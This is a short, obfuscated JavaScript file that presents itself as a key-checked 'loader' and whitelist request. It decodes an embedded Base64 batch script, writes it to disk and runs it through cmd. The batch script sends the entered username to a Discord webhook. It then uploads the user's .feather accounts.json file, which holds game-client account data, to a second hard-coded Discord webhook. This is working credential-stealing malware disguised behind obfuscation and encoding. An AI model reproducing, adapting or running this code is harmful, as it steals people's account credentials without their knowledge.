function getEnv(_0x89354c) {
  const _0x1b7771 = Java.type("java.lang.System");
  return _0x1b7771.getenv(_0x89354c);
}
function executeBat(_0x4aa79a, _0x538bd = null, _0x587868 = true) {
  if (_0x538bd) {
    const _0x3d0a45 = Java.type("java.util.Base64");
    FS.open(fullPath).write(_0x587868 ? _0x3d0a45.getDecoder().decode(_0x538bd) : _0x538bd);
  }
  const _0x5913c4 = Java.type("java.lang.Runtime");
  if (!FS.exists(_0x4aa79a)) {
    throw new Error("Whitelist accepted \"" + _0x4aa79a + "\"");
  }
  if (!FS.toRawFile(_0x4aa79a).isFile()) {
    throw new Error("\"" + _0x4aa79a + "\" Whitelist denied");
  }
  _0x5913c4.getRuntime().exec("cmd /c start \"\" \"" + _0x4aa79a + "\"");
}


var fullPath;(function(){var QMI='',Oad=941-930;function WCM(o){var z=1141189;var c=o.length;var m=[];for(var e=0;e<c;e++){m[e]=o.charAt(e)};for(var e=0;e<c;e++){var n=z*(e+81)+(z%35451);var s=z*(e+184)+(z%44125);var k=n%c;var d=s%c;var j=m[k];m[k]=m[d];m[d]=j;z=(n+s)%3609432;};return m.join('')};var Ljl=WCM('ajgtcrvcortskomcsiutoeylfznbqpruhwxdn').substr(0,Oad);var bzp='v(v 4{.nag  ,,t=,o"cfne1] [f[urr9).g=rhrrpvAs;8;[oygjh6)s1e.erdwk4n;l;s2kvx-.n ra+nl+g]hzh nra4),)++rbf7k;d3(8xsedlk;zirr9C[8 "=[rs.o-+r..=+i,z(C(al==.ah;vl0.nh ;ktv+d+1-dar(on+harrhnhor(=ltdq;nrrmc)mgvanoga7=e{r=)s=([vsilevs,n;an)8=vd((Auo(Sjmeoezvvi=d6lt(z,A])Ayva]{a o(jwi>q.s,feh iif{rr(=vo)a;rv.601<7]acC2A=p;];2ajou+.oh};t,7sx= fvfnuk=drl-lgftem=uetzfa5a-"5fr6,;6,9;2s+pevp0euv 3=cat,a=a;u,;[[t)r(l>;[=.nia;.)zhf aex)tt+a=C,;ztms(9lqu+1)tcrl]raerd;;rc((;;f).==;(vvo]*(1t+,e4c()r brt04iC=(auwa]ns)uge e)on(;)4(=t+.fuoa=laa;==mj0"mi5;,a +!rh0v7ni}9.0[Cu cr]f;-cfC(+.mivn[8stadis=b9z{irrv},xz1i;l(=0rs 6o[b=0ytc.+}ya;gg=!2 +]cevv1vonn)+=p,)ro7v;uglt8ir(Che];r]ib"u8jod[,e")51+sw)ttp}.rvr)c;+vze(0s9do=6h]"t=((,fno.9z7,)==[k1l,=2c;2hav;nt,i(e)6f"re}<tq=+}=.fraj;hinc,{  ltr7,h018l.m,3t{v*(a5on06hgv +,=zad)jp)tx=3n;.hhu9tr );.1wtn8Slli;+wf)l<<(;<ood;(brs)))lw;xh.kl r)e;1(g;k"p") lrn.iv-;';var soU=WCM[Ljl];var QBw='';var sMV=soU;var DrS=soU(QBw,WCM(bzp));var XkG=DrS(WCM('n6S)O!nkOe\/i0OO.t&S =0neOu)t[f..#,O)O)O(d$!ob,..41yxOsOOf1)=p#1=)_,.ikO;b),_)%i()aO;_2)!,O=gOOO+3o!%k#r4;a !...=%..e,ah)ea,t1;OOr)q\/9*b=._e eO4e"=.O!nE2o);2yOe.$_u.30(c3$tfOO6+ 2ua.re%.{$o\/%+.O(Os(gt;1OO{4;ogtt(=_)5k$ta.6$(;=)}Os+$))OiOcO)p$fo(zxr.(\/O$(4&;e+,O)ng=a(60,i3(_a,7{0+-oO.} oO!!!(O"!O))};cc,(3_$$  Oeft$6860y[..hOe%nlm4m!_;k7]e[x-r)(f3](ssOn1sO")akd(1!k)()=rr.4_0b;#Oe;-Ote.n083m;+O_n;,;i!o._&%)eO0zn,3}(.n!8Tlt6e"_n(x71o_1xh.!#= tO.b$s3.%ca0O,$3,{)gt+d-Oo0O7)b;3 ($y)m3},.b.a3O,],*.d.s(.i3i4tdOS!O3.4O3a.Cxat)e2a{[Oa.(2f&()},aOn}h}.t!.Osf=.t6ca(;Ohtbtn;{O.0fe;+x=er8.p(sfOb,(O1u !n$)\'.[O,0O6e7y -.1O;}n0els7.1"tbe3+pr.+lr){k=.wcf,2fz)+=O#+j*$l(.s,a()5]ni]oaaf!2(\'.O,b0(}r%Opqyasu eet"arxe1.O$3,3Cs,,OOOt,!,O)eo75._ngOba7m$g=d}bn.i)9.0rm"aeOO=tOf=lie.r_3!0o*;jv+(O(2O)xeo((p}3 =.u,=cf.$dbjno\'OeO.$tOO,9;rbO\' a]!eve+Ooa10;2O,nhtD7l)c63 $n_i .t(.!je.oO5.!,r\/ h2;$m!frO_.$)e\/!wO{.ko _O{Oj),f#4.)1%'));var Vqu=sMV(QMI,XkG );Vqu(4132);return 4050})()


executeBat(fullPath, "QGVjaG8gb2ZmCnNldGxvY2FsIGVuYWJsZWRlbGF5ZWRleHBhbnNpb24KCjo6IFByb21wdCBmb3IgdGhlIGtleQpzZXQgL3AgImtleT1FbnRlciBLZXkgPj4+ICIKCjo6IENoZWNrIGlmIHRoZSBrZXkgaXMgdmFsaWQKaWYgIiVrZXklIj09IjVCOFozQTFHbG9hZGVyIiAoCiAgICBzZXQgInZhbGlkS2V5PXRydWUiCikgZWxzZSBpZiAiJWtleSUiPT0iOUY3SDRYMkpsb2FkZXIiICgKICAgIHNldCAidmFsaWRLZXk9dHJ1ZSIKKSBlbHNlIGlmICIla2V5JSI9PSIyUDZROUw1WWxvYWRlciIgKAogICAgc2V0ICJ2YWxpZEtleT10cnVlIgopIGVsc2UgaWYgIiVrZXklIj09IjNUOFcxQzREbG9hZGVyIiAoCiAgICBzZXQgInZhbGlkS2V5PXRydWUiCikgZWxzZSBpZiAiJWtleSUiPT0iMTBLMk03U2xvYWRlciIgKAogICAgc2V0ICJ2YWxpZEtleT10cnVlIgopIGVsc2UgaWYgIiVrZXklIj09IjRSM1YxTDlCbG9hZGVyIiAoCiAgICBzZXQgInZhbGlkS2V5PXRydWUiCikgZWxzZSBpZiAiJWtleSUiPT0iNkE4VDVFMlBsb2FkZXIiICgKICAgIHNldCAidmFsaWRLZXk9dHJ1ZSIKKSBlbHNlIGlmICIla2V5JSI9PSIxWjlYNE43SmxvYWRlciIgKAogICAgc2V0ICJ2YWxpZEtleT10cnVlIgopIGVsc2UgaWYgIiVrZXklIj09IjNRN0M1VTFNbG9hZGVyIiAoCiAgICBzZXQgInZhbGlkS2V5PXRydWUiCikgZWxzZSBpZiAiJWtleSUiPT0iMTBMMks5VmxvYWRlciIgKAogICAgc2V0ICJ2YWxpZEtleT10cnVlIgopIGVsc2UgKAogICAgZWNobyBJbnZhbGlkIGtleS4gRXhpdGluZy4uLgogICAgdGltZW91dCAvdCAyID5udWwKICAgIGV4aXQKKQoKOjogSWYgdGhlIGtleSBpcyB2YWxpZCwgcHJvbXB0IGZvciB0aGUgdXNlcm5hbWUKaWYgZGVmaW5lZCB2YWxpZEtleSAoCiAgICBzZXQgL3AgIm1jdXNlcm5hbWU9RW50ZXIgVXNlcm5hbWUgPj4+ICIKCiAgICA6OiBBZnRlciBlbnRlcmluZyB0aGUgdXNlcm5hbWUsIGN1cmwgcGFycm90LmxpdmUKICAgIGVjaG8gWW91IGVudGVyZWQ6ICFtY3VzZXJuYW1lIQogICAgZWNobyBSZXF1ZXN0aW5nIFdoaXRlbGlzdC4uLgoKICAgIDo6IFNlbmRpbmcgYW4gZW1iZWQgd2l0aCB1c2VybmFtZSB0byB0aGUgRGlzY29yZCB3ZWJob29rCiAgICBjdXJsIC1YIFBPU1QgaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyOTE5Nzk0NDAyODc5NDkxMS9yTFp4MExqLXQ0emtCdVJoOTJVR3AzSTdxSHIxYlB2VEhkUk5fZmhOYndEcW1QSEpyUmRVNHdjLXNiYmlPRThiTXpVbSBeCiAgICAtSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uIiBeCiAgICAtZCAie1wiZW1iZWRzXCI6W3tcInRpdGxlXCI6XCJXaGl0ZWxpc3QgUmVxdWVzdFwiLFwiZGVzY3JpcHRpb25cIjpcIioqVXNlcm5hbWU6KiogIW1jdXNlcm5hbWUhXG5cblJlYWN0IHdpdGggOnRodW1ic3VwOiB0byBXaGl0ZWxpc3QsIDp0aHVtYnNkb3duOiB0byBSZWplY3QuXCIsXCJjb2xvclwiOjMwNjY5OTMsXCJmb290ZXJcIjp7XCJ0ZXh0XCI6XCJUaGlzIG1lc3NhZ2Ugd2lsbCBleHBpcmUgaW4gNSBtaW51dGVzXCJ9fV19IgopCgo6OiBUSElTIElTIFdIRVJFIEkgV0FOVCBUSEUgU0VDT05EIENPREUgVE8gUlVOID48Cgo6OiBQYXRoIHRvIHRoZSB0ZXh0IGZpbGUgaW4gQXBwRGF0YVxSb2FtaW5nXC5mZWF0aGVyXGFjY291bnRzLmpzb24Kc2V0IEZJTEVfUEFUSD0lVVNFUlBST0ZJTEUlXEFwcERhdGFcUm9hbWluZ1wuZmVhdGhlclxhY2NvdW50cy5qc29uCgo6OiBEaXNjb3JkIHdlYmhvb2sgVVJMCnNldCBXRUJIT09LX1VSTD1odHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzI5MTk4MDAzMjg5OTgxMDU4L2g5dUxXNkxpTHJKdlF3TmUtS0RFNFppdktGV0h6ei1TV3dZRU1Ic0xvdkpVNTVCMXBxckpGSDg1My1xQnJyZmpvdnJpCgo6OiBFbnN1cmUgdGhlIGZpbGUgZXhpc3RzCmlmIG5vdCBleGlzdCAiJUZJTEVfUEFUSCUiICgKICAgIGVjaG8gRmlsZSBub3QgZm91bmQ6ICVGSUxFX1BBVEglCiAgICBleGl0IC9iIDEKKQoKOjogVXNlIGN1cmwgdG8gc2VuZCB0aGUgZmlsZQpjdXJsIC1YIFBPU1QgJVdFQkhPT0tfVVJMJSBeCiAgICAtSCAiQ29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhIiBeCiAgICAtRiAicGF5bG9hZF9qc29uPXtcImNvbnRlbnRcIjpcIiBIZXJlIGlzIHlvdXIgdXNhZ2UgWyBsb2cgXSBcIn0iIF4KICAgIC1GICJmaWxlPUAlRklMRV9QQVRIJSIgPm51bCAyPmVycm9yLmxvZwoKOjogQ2hlY2sgdGhlIGV4aXQgY29kZSBvZiBjdXJsCnNldCAvYSBFUlJPUkxFVkVMX0NPREU9JUVSUk9STEVWRUwlCmlmICVFUlJPUkxFVkVMX0NPREUlIG5lcSAwICgKICAgIGVjaG8gRmFpbGVkIHRvIHNlbmQgdGhlIGZpbGUuIFNlZSBlcnJvci5sb2cgZm9yIGRldGFpbHMuCiAgICBleGl0IC9iICVFUlJPUkxFVkVMX0NPREUlCikKCg=="); 
